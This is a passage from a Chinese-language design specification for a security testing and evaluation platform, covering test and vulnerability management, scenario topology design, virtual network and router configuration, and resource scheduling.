进行分类，便于用户快速定位和选择。上传功能支持各种测试工具的集成，增强系统功能。绑定实物设备，即与实物设备的绑定机制则确保测试工具与相应设备的兼容性和高效协同工作。快速检索功能通过关键词、分类或自定义过滤条件，帮助用户迅速找到所需工具。</p><p>13）模板管理功能是系统的核心，提供测试项目模板、测试方案模板、测试报告模板和测试环境模板。这些模板标准化测试过程，减少重复性工作，加速测试配置。用户可以根据需求选择和自定义模板，实现测试流程的快速部署和重复使用。此外，模板库的维护和更新也是系统管理的一部分，确保模板的现代性和适用性。</p><p>14）测试工具的按需接入和调用机制提高了测试环境的灵活性和可扩展性。用户可以根据测试需求选择和集成各种测试工具。系统支持多种工具的兼容性和协同工作，允许用户灵活配置测试环境，适应不同的测试场景。</p><p>15）在线编辑测试方案的功能提供富文本编辑器，支持复杂的文本格式和内容编辑。用户可以在线创建、编辑和保存测试方案，提高测试准备的效率。同时，系统支持在线编辑的测试方案下载，便于用户在不同环境或平台上使用和共享测试方案。</p><p>16）系统在测试对象管理方面提供了灵活的配置和管理能力。用户可以在测试项目中添加测试对象，并为每个测试对象配置专属的测试环境。这包括设置测试参数、选择测试工具和定制环境变量。系统允许多种测试对象的并行管理，支持不同类型和规模的测试需求。这种管理方式提高了测试活动的针对性和有效性，确保测试环境与测试对象的最佳匹配。</p><p>17）系统中漏洞信息的提交和状态查询功能，是确保软件安全性的关键环节。用户可以提交发现的漏洞信息，系统记录并跟踪漏洞处理进度。漏洞的复测以闭环处理机制确保每一个报告的漏洞得到彻底解决。系统支持漏洞的追踪、验证和修复状态更新，确保漏洞处理的透明性和可追溯性。</p><p>18）系统提供的漏洞统计和图表展示功能，有助于用户快速理解和分析漏洞数据。包括漏洞等级、状态、分布等关键信息的可视化展现。通过图表，用户可以获得漏洞概览，识别漏洞分布的模式和趋势。</p><p>19）漏洞知识库管理功能使用户能够链接到与测试场景中发现的漏洞相关的知识库。这个库包括历史漏洞数据、修复方法、防护措施等。用户可以根据测试结果访问相关知识，帮助更快地理解和解决漏洞。20）系统的测试资产管理功能不仅提供了资产信息、资产服务商和资产组件的管理功能，还深入分析了资产组件的潜在漏洞，并允许用户查看已发现的测试漏洞。系统通过全面的资产管理，帮助用户更好地了解和管理复杂的资产关系，为测试工作提供了有力的支持。此外，系统还提供了资产组件依赖关系的展示与查看功能，使用户能够清晰地看到各资产组件之间的关系，有助于用户进行更有效的测试和问题排查。</p><p>21）测试人员能够按照用例类型或测试对象进行过滤的功能，提高测试活动的准确性和可追踪性。测试人员能够有效地定位到特定的测试用例或对象，对测试内容和结果的进行编辑和优化。系统还提供了灵活的过滤选项，用户可以根据实际需求进行自定义设置，以适应不同的测试场景和需求。</p><p>22）系统能够收集和处理由测试工具生成的测试数据，并支持自动化匹配和评估，提升测试效率，减少了人工干预。自动化的数据处理机制可以快速匹配测试结果与预期输出，评估测试效果，从而加速测试周期并提高测试的可靠性。</p><p>23）系统通过实时更新测试进度，使用户能够随时了解测试任务的执行情况。这种实时反馈机制有助于用户及时发现和解决问题，避免因任务延迟或错误而导致的损失。此外，系统还支持对测试进度进行可视化展示，使用户能够看到任务的完成情况和进度条。实时反馈测试进度的功能使用户能够及时了解测试活动的当前状态，帮助项目团队及时调整策略和资源分配，确保测试活动按计划进行。</p><p>24）系统支持人工处理测试用例提交的测试结果，并能够根据这些结果生成总的测试结论，提供全面的测试结果分析。人工处理机制确保对复杂或模糊的测试结果进行深入分析，而自动化生成的总结则提供了快速的决策支持。</p><p>25）系统具备根据测试结论生成详细测试报告的功能，报告内容涵盖关键指标，如测试用例通过数、未通过数，以及基于测试结果得出的综合结论和评分。测试报告还包含对关键问题的分析、建议的改进措施、未来测试计划等。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/9e1f75b99f847a42efd47cac8a231b9b.png"></p><p>26）系统中测试报告导出功能支持用户能将测试报告以PDF格式导出，确保报告在不同的设备和平台上都能被准确地查看和打印，便于跨部门、团队甚至组织间的交流，确保关键信息的完整性和可访问性得到保障。</p><p>27）系统具备的一键同步功能能够将模块中存在的测试任务同步至测试管理平台，可将模块中的测试任务快速同步至测试管理平台。这种同步机制确保了数据的一致性和完整性，避免了手动传输和重复输入的繁琐操作，每次同步任务数量不低于100个，并支持任务同步更新，保证测试管理平台能够及时获得最新的任务状态信息。系统还支持任务同步更新功能，确保了测试管理平台上的任务数据始终是最新的状态。这种高效的任务管理方式提高了团队的工作效率和质量，为项目进展提供了有力保障。</p><h4 id="性能实施方案-9"><a href="#性能实施方案-9" class="headerlink" title="性能实施方案"></a>性能实施方案</h4><p>1）系统在性能方面的设计支持同时开展不少于100个测试任务。系统采用高效的任务调度和资源管理机制，任务调度机制负责合理分配系统资源，优化任务执行顺序，减少任务冲突和等待时间。资源管理则关注于最大化资源利用率，包括计算资源、存储资源和网络资源的合理分配和调度。这种设计确保即使在高并发的测试需求下，系统也能保持高效率和稳定性，从而支撑大规模的测试活动。</p><p>2）系统中测试poc（Proof of Concept）库的容量达到2000个以上，系统的数据库管理和查询性能针对大规模测试需求进行优化，满足POC数据库大数据量管理的需求。。</p><h4 id="技术实现内容-9"><a href="#技术实现内容-9" class="headerlink" title="技术实现内容"></a>技术实现内容</h4><p>功能参数为，系统提供全面的测试项目管理，涵盖测试准备、执行和归档，确保全流程管理的高效实施。此外，系统允许配置测试项目的关键元素：测试对象、人员和环境，包括为测试人员分配必需的环境接入机器，并支持将测试项目细化为多个测试项。对于测试项的管理，系统允许配置具体的测试用例，这包括直接添加新用例或从现有的测试用例库中选择。</p><p>进一步地，系统支持测试项的流程编排，定义包括人工单例、批量、自动化测试、流量采集和分析、攻击等多种类型的测试事务。这些测试事务可以灵活编排到测试流程的各个步骤中，并且每个步骤可以被设置为人工执行或自动执行。系统还提供了测试项目执行的控制功能，包括开始和停止操作。</p><p>在测试执行方面，系统使测试人员能够查看项目详情，并通过接入机器登录到测试环境中，按照测试方案和用例要求进行测试。系统支持测试人员根据测试用例提交测试结果，结果支持富文本格式，增强了结果表达的灵活性。此外，系统能够进行全面的测试统计，包括测试项数量、测试用例数、产品和公用漏洞数，还包括测试用例的通过率统计及其图表展示。</p><p>对于测试结果的管理，系统支持测试结果的查看，并能够基于这些结果自动生成详尽的测试报告。系统还允许重新开启测试活动进行复测，同时对历史测试数据进行归档处理，确保历史数据和报告的可访问性。此外，系统还涵盖了广泛的资源管理功能，包括实物和虚拟测试设备及其镜像的管理，测试工具的分类管理，测试模板的管理，以及测试方案和测试对象的综合管理。</p><p>系统不仅处理测试项目中发现的漏洞信息，提供快速查询和复测，还支持对测试中发现的漏洞进行统计和图表展示，包括漏洞等级和状态。系统还提供了漏洞知识库的管理功能，允许用户根据测试场景中发现的漏洞链接到对应的知识库。在测试资产管理方面，系统提供了资产信息、服务商、组件、组件成分分析及其潜在漏洞的展示，并支持查看资产测试中发现的漏洞，展示资产组件的依赖关系。</p><p>性能参数为，系统支持同时开展100个测试任务，确保了在高负载条件下的稳定运行。此外，系统的测试poc库包含2000个项目，提供了丰富的测试资源和场景，以满足广泛的测试需求。</p><p>系统具备测评任务的管理功能，支持测评任务增删改查、测评报告管理和测评状态的监视，支持历史测评任务的查看，可根据任务的名称、时间、参与人员等进行任务检索。</p><p>系统具备测评场景设计与构建功能，支持多人多层同时设计测评场景，支持一个测评任务在多个测评场景间切换，支持场景、子场景、设备等多级模板的保存与使用，支持节点复制、模板组合、多人多层共享设计等多种方式提高测评场景构建效率。支持拓扑编辑通过增加镜像线的方式支持测评场景内部虚拟主机流量镜像的功能，将特定的虚拟机指定端口的流量镜像到另一虚拟机的指定端口，实现测评场景中内部旁路监听功能。</p><p>系统支持在测评场景中描述各类网络设备、安全设备、工具设备等，能够动态组网实现防御能力评测、渗透测试等的各种典型场景。</p><p>系统具备测评资源调度功能，支持靶标、工具等资源的预约，支持根据资源预约情况和资源实时状态自动调度生成测试环境。</p><p>系统具备测评流程编排导调功能，支持在流程中对攻防渗透、安全防御检测、漏洞挖掘、靶标配置按照步骤进行编排和调度，流程编排支持步骤的分支和汇聚，支持收集各系统状态数据并监控相关任务状态。测评流程编排包括测试方案选择、测试用例配置、测评场景定义等，测试用例支持对测试用例的详细任务进行配置和调度，包括执行脚本、下发配置和向工具下发任务等。支持通过专用数据通道向测评场景内设备下发任务配置和收集结果。</p><p>系统具备数据采集能力，支持采集测试工具、设备的状态信息和测试过程信息，支持采集指定节点的流量报文，并能发送给指定的分析与存储设备进行分析存储，并能根据不同的试验给流量实时标记不同标签，用于不同任务数据的查询。</p><p>系统具备测评归档和防护策略演进分析功能，支持任务结束后对任务相关数据进行归档，便于后续进行相关信息查询，支持跨任务的防护策略演进分析。</p><p>系统具备测试过程中测评数据存储能力。原始测评报文存储处理性能不低于1Gbps，支持数据包加密存储，支持压缩存储。支持指定IP、端口等五元组条件对测评原始报文进行检索，检索性能不低于10TB/s。</p><p>支持同时管理和调度的任务数不低于100个，单个测评场景拓扑节点数不低于10000个，测评场景分层编排的层级数不低于5层，具备1000节点集群的批量化配置能力，支持测评任务通过不低于10个场景模板进行组合，具备测评环境根据测评任务进展更新功能，支持同时接入系统进行测评操作的人数不低于100人，支持虚拟和实物设备的接入方式不低于3种，支持系统测试poc库不低于2000个。</p><p>测评流程编排导调一个测评试验具备的流程步骤的数量不低于10个，一个步骤具备执行的事务数量不低于10个，支持场景流程的循环执行次数不低于10次。</p><h5 id="安全攻防任务管理子模块"><a href="#安全攻防任务管理子模块" class="headerlink" title="安全攻防任务管理子模块"></a>安全攻防任务管理子模块</h5><h6 id="测评任务管理"><a href="#测评任务管理" class="headerlink" title="测评任务管理"></a>测评任务管理</h6><p>测评任务管理负责测评任务增删改查、测评报告管理和测评状态的监视，支持历史测评任务的查看，可根据任务的名称、时间、参与人员等进行任务检索。支持任务结束后对任务相关数据进行归档，便于后续进行相关信息查询。</p><p>测评任务管理负责测评全生命周期的管理，包括需求管理、测试计划管理、测试用例管理和测试报告管理等功能。</p><p>需求管理：需求管理模块是需求分析员对测试需求进行新增、修改、删除以及提交审核 的操作。其具体的业务流程是：需求分析员进入登录界面，输入验证信息，若验 证信息正确则进入相应权限页面；若验证信息错误，则系统给出提示，需重新输入。需求分析员进入系统界面后，选择需求管理模块，可进行新增需求、修改需求信息和删除需求操作。新增需求时，系统判断需求ID是否己存在，若己存在, 系统给出提示信息；删除需求时，系统给出确认删除的提示。新增、修改或删除 需求后，系统更新需求信息。</p><p>新增需求：此功能模块是对新增需求功能点的管理。它是根据软件需求规格说明书提取 出来的测试需求，新增需求必须经评审通过了才能生效。需求应以一个功能点对 应一个需求ID的条例形式统计出用户需求，这样把需求从传统的文档形式转化 为一条条的功能点，不仅便于查证是否与用户需求一致，而且便于检査测试用例 是否全面覆盖了需求中的功能点。</p><p>修改需求：此功能模块是对需求功能点进行修改的管理。经修改的需求必须通过评审才 能生效，且在修改需求时需要填写修改人姓名以及修改原因，且在修改成功后， 原需求仍然存在，只是显示为失效状态。</p><p>删除需求：此功能模块是对需求功能点进行删除的管理。需要删除的需求必须通过评审 才能生效，且在删除需求时需要填写删除人姓名以及删除原因，且在删除成功后， 原功能点仍然存在，只是显示为失效状态。</p><p>审核需求：此功能模块是对需求变更进行审核的管理。审核人对需求变更的申请进行评 审，给出“审核通过”或“审核驳回”的评审结果，在驳回时需备注驳回原因。</p><p>发布需求：此功能模块是对审核通过的需求进行发布的管理。审核通过的需求经过发布 则可正式被使用。</p><p>需求变更：此功能模块是对已变更的需求进行的相关管理。需求管理中既有对需求变更 后的记录，也保存变更前的记录，以供日后进行工作追踪。</p><p>测试需求修改管理的流程如下图所示：</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/d9c51ec876edc86d66425a0ef11152d0.png"></p><p>测试需求管理流程</p><p>需求分析员在需求管理页面，选择修改需求子功能，选择一条需求信息，触发一个 demandAlterBefore.action请求；</p><p>demandAlterBefore.action 请求被 struts.xml 文件拦截并选择 demandAlterBeforeAction.java 类处理请求；</p><p>demandAlterBeforeAction类获取所有已存在以及需要修改的需求信息, 然后将获取的结果返回给struts.xml,若果返回的是success结果，则跳转到 demandAlterContext.jsp页面(修改需求对话框页面）；</p><p>需求分析员修改需求信息，并点击确定；</p><p>提交信息的post方法将信息的参数传递给demandAlterAction.java类进 行处理；</p><p>demandAlterAction.java 类将 demandAlterContext.jsp 页面传来的信息进 行处理并添加在数据库中，且将返回结果(SUCCESS或INPUT）传送给struts.xml, 让其选择相应的返回页面，若返回的是“SUCCESS”则跳转到修改需求主页面</p><p>(demandAlterMain.jsp）；</p><p>修改操作执行后，向LogRecord类发出调用refresh(）方法的消息进行 日志的记录操作。</p><p>需求管理是需求分析员对新增需求、修改需求信息、删除需求以及提交需求 审核的操作。现以新增需求为例进行详细叙述。</p><p>点击新增按钮，弹岀新增需求对话框，对话框中包含以下字段：需求ID、 需求名称、所属模块、需求描述、功能限制条件和备注。其中，需求ID是唯一 性标识，不可重复，需求名称、所属模块和需求描述是必填项。当输入已存在的 需求ID时，系统需给出“需求ID已存在，请重新输入”的提示；当点击保存时, 若必填字段处为空，则系统给出“请输入必填信息”提示。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/574cad0cbec495321a128e8affd13b78.png"></p><p>点击需求记录的详情标识，系统显示的表单为不可编辑状态。在撰写用例时， 每条用例会有对应的用例ID,且因每条用例都会对应于一条需求信息，因此在 用例信息中会有用例所对应的需求ID所以当点击查看一个已经有对应用例的 需求信息时，需求表单详情会比新增需求表单多一个“用例ID”字段，且一个 需求ID可能对应多条用例ID。</p><h6 id="测试计划管理"><a href="#测试计划管理" class="headerlink" title="测试计划管理"></a>测试计划管理</h6><p>测试范围：此功能项是对测试工作范围的管理。依据测试需求中的功能点来制定测试工 作的范围，告诉测试工作人员需要做什么，并用什么样的数据进行测试。</p><p>测试人员：此功能项是对测试人员信息的管理。主要是对参与一个项目测试工作的所有人员信息的管理。</p><p>测试分工：此功能项是对测试人员工作分配的管理。如测试负责人由谁担任，测试高级工程师(负责撰写测试用例）由谁担任，测试工作由谁负责等。</p><p>测试时间：此功能项是对测试时间安排的管理。主要是对测试工作的阶段性安排，特定 时间完成特定任务的规划，如何时启动测试工作、何时完成哪些模块的测试，何时进行回归测试等。</p><p>测试环境：此功能项是对实施测试工作所需的环境和资源的描述。测试环境是指能够完 成测试工作所必须的计算机硬件、软件以及其他的设备资源。稳定的测试环境有助于测试工作高效完成，一般情况，实施测试时需将测试环境的配置信息妥善保 存，以备日后能够快速还原工作中的问题。</p><h6 id="测试用例管理"><a href="#测试用例管理" class="headerlink" title="测试用例管理"></a>测试用例管理</h6><p>新增用例：此功能模块是对新增用例的管理。测试高级工程师根据机构订购的测试规范 进行用例的撰写，新增用例必须经评审通过了才能生效。用例应有用例ID编号, 与需求功能点对应，且多条用例可以对应一个需求功能点。</p><p>修改用例：此功能模块是对用例进行修改的管理。经修改的用例必须通过评审才能生效，且在修改用例时需要填写修改人姓名以及修改原因，且在修改成功后，原用例仍然存在，只是显示为失效状态。</p><p>删除用例：此功能模块是对用例进行删除的管理。需要删除的用例必须通过评审才能生效，且在删除用例时需要填写删除人姓名以及删除原因，且在删除成功后，原用例仍然存在，只是显示为失效状态。</p><p>待审核用例：此功能模块是对用例变更进行审核的管理。审核人对用例变更的申请进行评 审，给出“审核通过”或“审核驳回”的评审结果，在驳回时需备注驳回原因。 审核人在此模块可看到需要审核的用例，发起用例变更的申请人也可在此模块中 看到审核情况。</p><p>用例分配：此功能模块是对用例进行分配的管理。撰写测试用例的人员（测试高级工程 师）在此模块中将生效的用例按照用例编号分配给测试人员，测试人员可在此模 块中看到自己需要测试的用例情况。</p><p>用例测试结果：此功能模块是对用例执行结果的管理。当所有测试用例被执行完毕后，测试 高级工程师对整个测试工作进行跟踪记录，对于通过、未通过以及缺陷情况进行统计分析。</p><h6 id="测试报告管理"><a href="#测试报告管理" class="headerlink" title="测试报告管理"></a>测试报告管理</h6><p>新增测试报告：此功能项是对新增测试报告的管理。它是测试人员和测试负责人对测试工作 的阶段性汇报。其中，由于测试人员有新增测试报告权限，而无修改测试报告权 限，所以测试人员在新增测试报告时需备注新增时间，系统将自动以最后一次新 增时间为准。</p><p>修改测试报告：此功能项是对测试报告进行修改的管理。只有测试负责人拥有该功能模块的 权限，在测试负责人修改测试报告时需填写修改人姓名并记录修改时间，在修改 成功后，以前的测试报告仍然存在，只是显示为失效状态。</p><p>删除测试报告：此功能项是对测试报告进行删除的管理。只有测试负责人拥有该功能模块的 权限，在测试负责人删除测试报告时需填写删除人姓名并备注删除原因，在删除 成功后，以前的测试报告仍然存在，只是显示为失效状态。</p><h6 id="测评场景设计与构建"><a href="#测评场景设计与构建" class="headerlink" title="测评场景设计与构建"></a>测评场景设计与构建</h6><p>系统支持多人多层同时设计测评场景，支持一个测评任务在多个测评场景间切换，支持场景、子场景、设备等多级模板的保存与使用，支持节点复制、模板组合、多人多层共享设计等多种方式提高测评场景构建效率。支持拓扑编辑通过增加镜像线的方式支持测评场景内部虚拟主机流量镜像的功能，将特定的虚拟机指定端口的流量镜像到另一虚拟机的指定端口，实现测评场景中内部旁路监听功能。</p><p>系统支持在测评场景中描述各类网络设备、安全设备、工具设备等，能够动态组网实现防御能力评测、渗透测试等的各种典型场景。</p><h6 id="虚拟网络配置"><a href="#虚拟网络配置" class="headerlink" title="虚拟网络配置"></a>虚拟网络配置</h6><p>虚拟主机（虚拟机节点和仿真节点）与虚拟链路（虚拟交换机和虚拟路由器等虚拟网络设备）的配置为用户提供自动或者手动地配置虚拟网络环境中的虚拟机和虚拟路由器的功能，从而实现包含虚拟机、协议栈仿真节点和虚拟路由交换链路仿真的复杂网络。</p><p>虚拟主机与虚拟链路配置从如下几个方面实现系统的自动配置：</p><p>方式1、将虚拟机中需要的软件及配置固化在虚拟机镜像中，在虚拟机部署</p><p>启动的时候，就自动运行。一般来说，在软件安装部署与在环境无关，或者虽然相关，但使用不多，可以固定环境参数如IP地址的情况下，通常使用这种方式。</p><p>方式2、将虚拟机中需要的软件固化在虚拟机镜像中，但是在虚拟机部署的时候，将配置注入到虚拟机，虚拟机启动的时候，装载配置，实现自动配置。一般来说，在软件可以预先知道其环境设置的情况下，通常使用这种方式。</p><p>方式3、将虚拟机中需要的软件固化在虚拟机镜像中，但是在虚拟机部署完</p><p>成后，系统自动登录虚拟机，执行预定的程序，将配置注入到虚拟机，实现自动配置。一般来说，在软件依赖其它虚拟机的部署参数，但依赖度不高的情况下，通常使用这种方式。</p><p>方式4、人工配置。通过虚拟节点访问子系统，登录虚拟机，完成配置。</p><p>综合上述，虚拟节点配置的组成如所示。虚拟节点配置可分为虚拟环境配置控制和自动配置模块组成。虚拟环境配置控制负责解析任务配置的参数，按逻辑关系控制自动配置任务的执行，并将执行结果返回到上层调用。自动配置模块根据配置的参数，选择合适的配置文件注入到虚拟机镜像并部署虚拟机镜像，并根据需要和可能，执行远程过程调用，完成自动配置。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/d47353c9da35bcb69828a6606dc463f3.png"></p><p>虚拟节点配置</p><p>虚拟主机及链路配置主要支持以下两个核心工作流程：1、虚拟主机节点的配置；2、虚拟路由的配置。</p><p>虚拟节点的配置</p><p>通过配置文件来决定启动的虚拟节点的类型和数据，配置文件采用XML文件格式。通常情况下，虚拟节点都有服务端和客户端，系统通过在部署服务端时，绑定注入网络的方式部署，即网络拓扑设计时固定了服务器的IP，这就使得客户端部署时可以直接使用服务器的IP。虚拟节点的配置生成主要包含如的步骤。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/04061e80c1c6706316d9c87f59ffb6c8.png"></p><p>虚拟节点的配置</p><p>具体说明如下：</p><p>1）.配置解析向任务控制发出部署服务器任务；</p><p>2）.任务控制将任务发送给虚拟机按需部署往服务端注入虚拟节点配置文件；</p><p>3）.虚拟机部署部署服务端虚拟机，并给虚拟机绑定IP ；</p><p>4）.配置解析发出部署客户端任务；</p><p>5）.任务控制将任务发送给虚拟机按需部署往客户端注入虚拟节点配置文件；</p><p>6）.虚拟机部署客户端虚拟机；</p><p>7）.如果需要跨子网使用且需要作nat映射，在虚拟路由器上配置转发规则和防火墙规则；</p><p>8）.配置解析发出部署外网客户端任务，请求配置管理生成外网客户端配置文件；</p><p>9）.任务控制将任务发送给虚拟机按需部署往外网客户端注入虚拟节点配置文件；</p><p>10）.在部署远程访问客户端时注入新生成的配置文件，部署外网客户端虚拟机。</p><p>网络环境配置</p><p>为试验环境的图形可视化设计提供了一套全面的网络拓扑编辑工具，以支持试验环境的编辑和配置 功能。同时，支持虚拟机主机（包括基础主机、数据库服务、邮件服务、web服务、DNS、虚拟靶机、攻击机、用户自定义主机）、流量模拟虚拟机节点和docker节点（HTTP流量、mail流量、FTP流量）、虚拟网络设备（包括路由器、防火墙、动态路由器和WAF等）、实物主机、靶机和网络设备。</p><p>支持拓扑图的分层展示、按比例缩放和聚合，可在拓扑图中以拖拽方式快速加入各种类型的集群。拓扑图的编辑，要求支持子网以拖拽的方式加入试验网且可以配置其属性，支持子网的可视化拓扑编辑，允许以拖拽的方式完成子网中各类节点链路的组网；拓扑图分层展示，要求支持鼠标滚动时整个拓扑的缩放，支持放大时子网和集群拓扑详情查看、缩小时子网和集群节点聚集的效果；集群定义配置，要求支持集群预定义、支持集群运行时节点数自由扩展、支持子网中以拖拽方式接入各种类型的集群。在拓扑图单页面中，随机生成1万2千个节点、5000条连线, 平均用时可在1 秒以下，且能对这些节点任意的编辑。</p><p>网络环境是由网络及子网、设备等组合而成。系统提供统一的可视化网络设计。通过新建网络或者导入环境模板创建网络。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/c027e157bdc52d89ef86c1192ba41329.png"></p><p>创建网络</p><p>网络通过可视化的编辑工具，自由拖放网元进行组合。支持的设备包括子网、交换机、路由器、实物交换机、路由器、防火墙、服务器等。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/cf4179099c8bc9a742947ceab5123471.png"></p><p>可视化设计网络</p><p>虚拟机配置</p><p>虚拟机具有操作系统类型，方案引用，磁盘方案，所属网络、IP，用户名、密码等相关属性。参数还包括IP/MAC地址、网关地址、型号等。虚拟机提供对多种服务器类型的支持，包括邮件服务器、应用服务器、数据库服务器、内容管理系统(CMS）服务器、文件服务器和WEB服务器。也支持对离散节点进行仿真。配置这些虚拟机时，可以设定多种参数，如设备型号、登录用户信息、登录凭证、操作系统和应用软件等。服务器的类型既支持KVM的节点、docker容器节点、KVM集群、docker集群等。离散事件模拟节点支持IPv4协议的标准数据通信，支持网络蠕虫模拟，支持IP地址的统一管理与配置，支持对离散事件模拟节点的自动化配置。在虚拟节点属性中，界面上用户输入配置属性允许用户输入虚拟机的相关配置。实现通过非网络接口控制虚拟节点或脚本、执行命令，并获取执行结果。</p><p>除在设置各种服务器时，系统自动对这些设备可选用的模板进行过滤。虚拟机可定义多个网卡，在编辑网络拓扑时，将虚拟机连到多个网络中，该虚拟机在部署时自动生成与各个网络相连的网卡，网卡的IP可在设计时进行设置。虚拟机之间支持模拟网络链路的功能，能够仿真包括带宽、延迟、丢包率和误码率等网络链路的关键特性。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/6a0e9cdf47141b58dcc1035798d6b625.png"></p><p><strong>虚拟机配置</strong></p><p>虚拟路由的配置</p><p>系统使用虚拟机来作为虚拟的路由器，连接系统中的子网络组成一个更大的网络。虚拟路由器可以连接在多个子网络上，实现子网之间的数据流的转发。虚拟路由的配置主要是为路由器配置路由信息，对支持防火墙的虚拟路由器，配置防火墙的出入口规则和转发规则。针对不同类型的虚拟路由器，系统定制了虚拟路由器支持的程序脚本模板，脚本包括：路由设置、防火墙规则、和转发规则等。虚拟路由器有一个网卡固定连接在一个系统定义的管理子网上，程序通过该子网，根据模板和实际参数，产生远程调用脚本，在虚拟路由器上执行，实现虚拟路由器的配置。</p><p>虚拟路由器配置部署的流程如所示。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/8068871d33abe4b697294883041a5afb.png"></p><p>虚拟路由器配置部署</p><p>具体说明如下：</p><p>1）配置解析得到一个在子网上创建路由器的任务，并解析得到配置参数如路由器模板、IP、子网掩码、DNS等配置信息；</p><p>2）任务控制根据任务的并发情况，决定是否启动任务；</p><p>3）如果启动任务，调用虚拟机部署，部署虚拟路由器；</p><p>4）等待虚拟路由器启动；</p><p>5）配置解析得到一个在虚拟路由器上连接另一个子网的任务；</p><p>6）任务控制根据任务的并发情况，决定是否执行该任务；</p><p>7）如果执行该任务，系统在虚拟路由器上创建一个网卡，配置网卡网络参数，连接虚拟路由器和子网；</p><p>8）根据配置解析得到的参数，初始化路由配置模板为命令程序；</p><p>9）通过管理子网，远程执行命令程序。</p><p>路由器仿真功能能模拟动态和静态路由表，实现包过滤机制，支持设置优先级，并能在模拟的网络拥塞状态下进行包丢失处理能力的演练。仿真的路由器网络属性包括有路由器的名称、路由协议、静态路由配置，其中路由器的配置支持RIP、BGP、OSPF的协议配置，并支持IPV4，IPV6两种协议方式。配置界面可使用通过此参数，用户可以进行动态路由配置。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/113e679fcfc695bb1783ae0bd89dd628.png"></p><p>路由器属性设置</p><p>协议栈节点的配置</p><p>系统中包含一个协议栈节点生成模块，其工作流程如下：</p><p>1. 生成配置文件：首先，系统生成包含所需设置的协议栈节点的配置文件。</p><p>2. 发送配置文件：该配置文件随后被发送到协议栈节点生成模块。</p><p>3. 接收和解析：协议栈节点生成模块内部的管理部分接收到配置文件后，开始进行内容解析。</p><p>4. 节点配置：根据配置文件解析出的指令，完成对协议栈节点的最终配置。</p><p>通过这样的流程，可以确保协议栈节点得到正确配置，从而在网络中按预定的方式工作。</p><p>系统提供了一个可视化界面，允许用户通过拖放的方式来设计目标网络。这个界面支持对网络节点进行添加、删除和修改等操作。目标网络的设计兼容四种不同类型的节点：虚拟化节点、轻量级虚拟节点和实物网络节点，所有这些都可以统一在同一个界面中设计和配置。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/f55e962b1a2af2599e1df2e834f03262.png"></p><p>协议栈仿真配置</p><p>拓扑模板配置</p><p>除了支持全新设计网络拓扑外，还可通过基于模板的图形化配置方式进行网络拓扑配置。通过鼠标点击或拖拽方式选择设备、设置设备属性以及编辑设备间连接关系等操作。配置结果可保存、加载，以模板形式存储网络配置信息。 <img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/8d65040dc8dae86f0a42c1baf203ba6f.png"></p><p>拓扑模板配置</p><p>网络拓扑模板是由网络及子网、设备等组合而成。系统提供统一的可视化网络设计。通过新建网络或者导入环境模板创建网络。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/c027e157bdc52d89ef86c1192ba41329.png"></p><p>网络拓扑新建</p><p>网络拓扑模板也通过可视化的编辑工具，自由拖放网元进行组合。支持的设备包括子网、交换机、路由器、实物交换机、路由器、防火墙、服务器等。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/cf4179099c8bc9a742947ceab5123471.png"></p><p>设备配置</p><h6 id="测评资源调度"><a href="#测评资源调度" class="headerlink" title="测评资源调度"></a>测评资源调度</h6><p>测评资源调度为测评场景的按需创建、运行提供支持，与其他子系统协同实现测评场景的构建和运行管理。</p><p>在智能测评平台上，资源调度机制的核心职能是解析测评环境的布局以及参与者的配置需求。平台首先会对试验任务中所需的虚拟与实体资源进行识别与评估。一旦资源需求明确，平台就会将整个配置过程分解为一系列任务，并基于这些任务之间的依赖关系，确定其执行的顺序。</p><p>随后，任务会被放入一个异步处理队列中。此过程由一个监控系统持续跟踪，以确保每个任务都能按照既定顺序高效完成。除此之外，用户也可以通过平台的用户界面发起网络拓扑的配置变更要求。这些要求被转化为具体的管理任务，随后加入到异步任务队列中，由监控系统同样确保其顺利执行。</p><p>任务调度管理部门在此过程中扮演关键角色，它识别任务的类型并调用对应的处理模块来执行和调度任务。为了满足底层系统的特定需求，任务还会被细化为子任务，并分派至部署在计算机集群上的相关组件：包括虚拟网络配置管理模块和虚拟机管理模块。这些模块借助本地的虚拟化技术，负责具体任务的处理。一旦任务完成，其结果将通过消息队列系统返回给任务结果管理模块，为用户提供反馈。这样的设计不仅确保了高效、有序的资源调度和管理，还为用户提供了及时的任务执行反馈。</p><p>测评资源调度包含如下图功能部分：</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" 